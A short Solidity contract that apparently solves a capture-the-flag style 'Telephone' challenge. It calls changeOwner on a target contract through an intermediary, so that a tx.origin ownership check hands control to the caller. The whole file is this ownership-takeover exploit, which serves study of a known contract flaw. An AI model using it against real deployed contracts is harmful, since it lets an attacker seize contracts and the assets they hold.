//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
      function changeOwner(address _owner) external;
}

contract TelephoneBypass {

    ITelephone telephone;

    constructor(ITelephone _telephone) {
        telephone = _telephone;
    }

    function changeTelephoneContractOwner() external {
        telephone.changeOwner(msg.sender);
    }
}